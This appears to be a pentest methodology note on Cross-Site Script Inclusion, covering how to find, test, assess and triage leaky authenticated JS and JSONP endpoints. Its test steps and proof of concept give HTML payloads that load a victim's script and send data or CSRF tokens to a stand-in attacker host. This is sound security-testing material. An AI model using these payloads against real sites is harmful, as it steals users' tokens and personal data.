# Cross-Site Script Inclusion (XSSI)

**What it is:** A cross-origin page loads a victim's authenticated **dynamic JS endpoint** with `<script src>`. Because `<script>` isn't blocked by SOP, the browser executes the response in the attacker's page — leaking any data the endpoint embeds (variables, tokens, JSONP callbacks). The read-side analog of CSRF: you don't act as the victim, you *read* their response cross-origin.

## Where to look
- JS/`.js` (or JS-ish) endpoints whose body **changes when authenticated** — user data, config, CSRF tokens, feature flags baked into a script.
- JSONP endpoints (`?callback=`, `?jsonp=`, `?cb=`) — SOP bypass by design.
- Global variable assignments in dynamic JS: `var user = {...}`, `window.__CONFIG__ = {...}`.
- Non-JS content served with a script-executable path/type that leaks via error/array-prototype tricks (legacy).

## Test steps
- [ ] Diff the endpoint **with vs without** the session cookie (Burp DetectDynamicJS, or manual). Different body = candidate.
- [ ] If it defines globals, include it and read them:
```html
<script src="https://victim.com/userdata.js"></script>
<script>alert(window.user.email)</script>
```
- [ ] JSONP: set your own callback and capture the payload:
```html
<script src="https://victim.com/api/me?callback=leak"></script>
<script>function leak(d){ new Image().src='//attacker/?'+encodeURIComponent(JSON.stringify(d)); }</script>
```
- [ ] Legacy leaks: override `Array`/`Object` setters or catch parse errors to read non-JSONP data (mostly old browsers; note in report).

## Impact
Cross-origin theft of PII, CSRF tokens, session identifiers, or config → account takeover / CSRF-protection bypass, depending on what the script embeds.

## 🎯 PoC
Attacker page loads the victim's authenticated config script and exfils a token:
```html
<script src="https://victim.com/app/bootstrap.js"></script>   <!-- sets window.__CSRF -->
<script>new Image().src='//attacker/c?t='+window.__CSRF;</script>
```
Victim visits attacker page while logged in → their CSRF token lands at attacker.

## Fix / triage note
Real bug only if the endpoint (a) requires auth, (b) reflects **sensitive** data, and (c) is loadable as a script cross-origin (JS content-type or JSONP). Static/public scripts = no finding. Prove it leaks victim-specific data cross-origin.

## Related
`05-client-side/02-cors.md` · `05-client-side/01-csrf.md` · `04-auth-session/03-jwt.md` · `00-recon/05-js-analysis.md`
